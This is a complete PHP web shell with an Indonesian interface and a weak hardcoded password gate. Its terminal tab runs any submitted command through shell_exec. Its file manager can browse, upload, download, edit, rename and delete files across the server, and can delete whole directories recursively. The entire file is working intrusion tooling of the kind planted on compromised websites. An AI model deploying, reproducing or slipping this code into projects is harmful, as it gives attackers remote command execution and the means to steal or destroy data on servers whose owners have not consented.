<?php

$allowed_hash = hash("sha256", "sick");
session_start();
if (!isset($_SESSION['auth'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'])) {
        if (hash("sha256", $_POST['pass']) === $allowed_hash) {
            $_SESSION['auth'] = true;
        } else {
            echo "<p style='color:red'>Password salah.</p>";
        }
    }
    if (!isset($_SESSION['auth'])) {
        echo '<form method="post"><input type="password" name="pass" placeholder="Password"><input type="submit" value="Masuk"></form>';
        exit;
    }
}


$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = realpath($path);
$current_file = isset($_GET['file']) ? $_GET['file'] : '';

$message = '';
if (isset($_SESSION['message'])) {
    $message = $_SESSION['message'];
    unset($_SESSION['message']); 
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd . ' 2>&1');
} else {
    $cmd = '';
    $output = '';
}

if (isset($_FILES['upload_file']) && isset($_POST['upload_path'])) {
    $upload_path = $_POST['upload_path'];
    $target_file = rtrim($upload_path, '/') . '/' . basename($_FILES['upload_file']['name']);
    
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target_file)) {
        $message = "File " . basename($_FILES['upload_file']['name']) . " berhasil diunggah.";
    } else {
        $message = "Gagal mengunggah file.";
    }
}
if (isset($_GET['delete']) && file_exists($_GET['delete'])) {
    if (unlink($_GET['delete'])) {
        $message = "File berhasil dihapus.";
    } else {
        $message = "Gagal menghapus file.";
    }
    header("Location: " . $_SERVER['PHP_SELF'] . "?path=" . urlencode(dirname($_GET['delete'])));
    exit;
}

function delete_dir_recursive($dir) {
    if (!is_dir($dir)) {
        return false;
    }
    
    $files = array_diff(scandir($dir), array('.', '..'));
    
    foreach ($files as $file) {
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        
        if (is_dir($path)) {
            delete_dir_recursive($path);
        } else {
            unlink($path);
        }
    }
    
    return rmdir($dir);
}

if (isset($_GET['delete_dir']) && is_dir($_GET['delete_dir'])) {
    if (delete_dir_recursive($_GET['delete_dir'])) {
        $message = "Folder berhasil dihapus beserta isinya.";
    } else {
        $message = "Gagal menghapus folder. Pastikan Anda memiliki izin yang cukup.";
    }
    $_SESSION['message'] = $message;
    
    header("Location: " . $_SERVER['PHP_SELF'] . "?path=" . urlencode(dirname($_GET['delete_dir'])));
    exit;
}

if (isset($_POST['old_name']) && isset($_POST['new_name']) && isset($_POST['rename_path'])) {
    $old_path = $_POST['rename_path'] . '/' . $_POST['old_name'];
    $new_path = $_POST['rename_path'] . '/' . $_POST['new_name'];
    
    if (rename($old_path, $new_path)) {
        $message = "Berhasil mengganti nama.";
    } else {
        $message = "Gagal mengganti nama.";
    }
}

if (isset($_GET['download'])) {
    $file_path = $_GET['download'];
    if (file_exists($file_path) && is_file($file_path)) {
        $file_name = basename($file_path);
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $file_name . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        readfile($file_path);
        exit;
    }
}

if (isset($_POST['file_content']) && isset($_POST['file_path'])) {
    $file_path = $_POST['file_path'];
    $content = $_POST['file_content'];
    
    if (file_put_contents($file_path, $content) !== false) {
        $message = "File berhasil disimpan.";
    } else {
        $message = "Gagal menyimpan file.";
    }
}

if (isset($_GET['edit']) && file_exists($_GET['edit']) && is_readable($_GET['edit'])) {
    $edit_file = $_GET['edit'];
    $file_content = htmlspecialchars(file_get_contents($edit_file));
    $mode = 'edit';
} else {
    $mode = 'normal';
}

function get_file_list($dir) {
    $files = array();
    $dirs = array();
    
    if (is_dir($dir) && is_readable($dir)) {
        $items = scandir($dir);
        foreach ($items as $item) {
            if ($item != '.' && $item != '..') {
                $path = $dir . DIRECTORY_SEPARATOR . $item;
                $item_info = array(
                    'name' => $item,
                    'path' => $path,
                    'type' => is_dir($path) ? 'dir' : 'file',
                    'size' => is_file($path) ? filesize($path) : 0,
                    'perms' => substr(sprintf('%o', fileperms($path)), -4)
                );
                if (is_dir($path)) {
                    $dirs[] = $item_info;
                } else {
                    $files[] = $item_info;
                }
            }
        }
    }
    return array_merge($dirs, $files);
}

$files = get_file_list($path);
?>
<!DOCTYPE html>
<html>
<head>
    <title>0x blockKerangWord</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; }
        textarea { width: 100%; height: 300px; border: 1px solid #ccc; padding: 10px; }
        input[type=text] { width: 80%; border: 1px solid #ccc; padding: 5px; }
        input[type=submit], button { background: #f0f0f0; border: 1px solid #ccc; padding: 5px 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        table, th, td { border: 1px solid #ddd; }
        th, td { padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .message { padding: 10px; margin: 10px 0; background-color: #f8f8f8; border-left: 4px solid #4CAF50; }
        .tabs { display: flex; margin-bottom: 10px; }
        .tab { padding: 10px 15px; cursor: pointer; background: #f0f0f0; margin-right: 5px; border: 1px solid #ddd; }
        .tab.active { background: #fff; border-bottom: 1px solid #fff; }
        .tab-content { display: none; padding: 15px; border: 1px solid #ddd; margin-top: -1px; }
        .tab-content.active { display: block; }
        tr.folder { background-color: #f9f9f9; }
    </style>
    <script>
        function switchTab(tabId) {
            var contents = document.getElementsByClassName('tab-content');
            for (var i = 0; i < contents.length; i++) {
                contents[i].classList.remove('active');
            }
            var tabs = document.getElementsByClassName('tab');
            for (var i = 0; i < tabs.length; i++) {
                tabs[i].classList.remove('active');
            }
            document.getElementById(tabId).classList.add('active');
            document.getElementById('tab-' + tabId).classList.add('active');
            localStorage.setItem('activeTab', tabId);
        }
        window.onload = function() {
            var isEditMode = <?= ($mode == 'edit') ? 'true' : 'false' ?>;
            
            if (isEditMode) {
                switchTab('file-manager');
            } else {
                var activeTab = localStorage.getItem('activeTab');
                if (activeTab) {
                    switchTab(activeTab);
                }
            }
        }
        
        function confirmDelete(path, filename) {
            return confirm('Apakah Anda yakin ingin menghapus file ' + filename + '?');
        }
        
        function showRename(oldName, path, isDir) {
            var newName = prompt('Masukkan nama baru untuk ' + (isDir ? 'folder' : 'file') + ' "' + oldName + '":', oldName);
            
            if (newName && newName !== oldName) {
                var form = document.createElement('form');
                form.method = 'POST';
                form.action = window.location.href;
                
                var oldNameInput = document.createElement('input');
                oldNameInput.type = 'hidden';
                oldNameInput.name = 'old_name';
                oldNameInput.value = oldName;
                form.appendChild(oldNameInput);
                
                var newNameInput = document.createElement('input');
                newNameInput.type = 'hidden';
                newNameInput.name = 'new_name';
                newNameInput.value = newName;
                form.appendChild(newNameInput);
                
                var pathInput = document.createElement('input');
                pathInput.type = 'hidden';
                pathInput.name = 'rename_path';
                pathInput.value = path;
                form.appendChild(pathInput);
                
                document.body.appendChild(form);
                form.submit();
            }
        }
    </script>
</head>
<body>
    <h2>0x blockKerangWord</h2>
    
    <?php if (!empty($message)): ?>
    <div class="message"><?= $message ?></div>
    <?php endif; ?>
    
    <div class="tabs">
        <div id="tab-terminal" class="tab <?= ($mode == 'edit') ? '' : 'active' ?>" onclick="switchTab('terminal')">Terminal</div>
        <div id="tab-file-manager" class="tab <?= ($mode == 'edit') ? 'active' : '' ?>" onclick="switchTab('file-manager')">File Manager</div>
        <div id="tab-about" class="tab" onclick="switchTab('about')">About</div>
    </div>
    
    <div id="terminal" class="tab-content <?= ($mode == 'edit') ? '' : 'active' ?>">
        <form method="post">
            <input type="text" name="cmd" value="<?= htmlspecialchars($cmd) ?>" autofocus autocomplete="off">
            <input type="submit" value="Eksekusi">
        </form>
        <textarea readonly><?= htmlspecialchars($output) ?></textarea>
    </div>
    
    <div id="file-manager" class="tab-content <?= ($mode == 'edit') ? 'active' : '' ?>">
        <?php if ($mode == 'edit'): ?>
            <h3>Edit File: <?= htmlspecialchars($edit_file) ?></h3>
            <form method="post">
                <textarea name="file_content" rows="20"><?= $file_content ?></textarea>
                <input type="hidden" name="file_path" value="<?= htmlspecialchars($edit_file) ?>">
                <br><br>
                <input type="submit" value="Simpan">
                <a href="<?= $_SERVER['PHP_SELF'] ?>?path=<?= urlencode(dirname($edit_file)) ?>">
                    <button type="button">Batal</button>
                </a>
            </form>
        <?php else: ?>
            <h3>Lokasi: <?= htmlspecialchars($path) ?></h3>
            <form method="post" enctype="multipart/form-data">
                <h4>Upload File</h4>
                <input type="file" name="upload_file">
                <input type="hidden" name="upload_path" value="<?= htmlspecialchars($path) ?>">
                <input type="submit" value="Upload">
            </form>
            <?php if ($path != '/' && dirname($path) != $path): ?>
                <p>
                    <a href="<?= $_SERVER['PHP_SELF'] ?>?path=<?= urlencode(dirname($path)) ?>">
                        &laquo; Kembali ke direktori sebelumnya
                    </a>
                </p>
            <?php endif; ?>
            <table>
                <thead>
                    <tr>
                        <th>Nama</th>
                        <th>Ukuran</th>
                        <th>Izin</th>
                        <th>Aksi</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($files as $file): ?>
                        <tr class="<?= $file['type'] == 'dir' ? 'folder' : 'file' ?>">
                            <td>
                                <?php if ($file['type'] == 'dir'): ?>
                                    <a href="<?= $_SERVER['PHP_SELF'] ?>?path=<?= urlencode($file['path']) ?>">
                                        <span style="font-size: 16px;">📁</span> <?= htmlspecialchars($file['name']) ?>
                                    </a>
                                <?php else: ?>
                                    <span style="font-size: 16px;">📄</span> <?= htmlspecialchars($file['name']) ?>
                                <?php endif; ?>
                            </td>
                            <td><?= $file['type'] == 'dir' ? '-' : number_format($file['size']) . ' B' ?></td>
                            <td><?= $file['perms'] ?></td>
                            <td>
                                <?php if ($file['type'] != 'dir'): ?>
                                    <a href="<?= $_SERVER['PHP_SELF'] ?>?edit=<?= urlencode($file['path']) ?>">Edit</a> | 
                                    <a href="<?= $_SERVER['PHP_SELF'] ?>?download=<?= urlencode($file['path']) ?>">Download</a> | 
                                    <a href="<?= $_SERVER['PHP_SELF'] ?>?delete=<?= urlencode($file['path']) ?>" 
                                       onclick="return confirmDelete('<?= addslashes($file['path']) ?>', '<?= addslashes($file['name']) ?>')">Hapus</a> |
                                    <a href="#" onclick="showRename('<?= addslashes($file['name']) ?>', '<?= addslashes($path) ?>', false); return false;">Rename</a>
                                <?php else: ?>
                                    <a href="<?= $_SERVER['PHP_SELF'] ?>?delete_dir=<?= urlencode($file['path']) ?>"
                                       onclick="return confirm('Apakah Anda yakin ingin menghapus folder <?= addslashes($file['name']) ?> beserta seluruh isinya?')">Hapus</a> |
                                    <a href="#" onclick="showRename('<?= addslashes($file['name']) ?>', '<?= addslashes($path) ?>', true); return false;">Rename</a>
                                <?php endif; ?>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        <?php endif; ?>
    </div>
    
    <div id="about" class="tab-content">
        <h3>0x blockKerangWord</h3>
        <p>yagitulah.</p>
        <p><a href="https://github.com/0x-s1ck" target="_blank">ma Githuwbb</a></p>
    </div>
</body>
</html>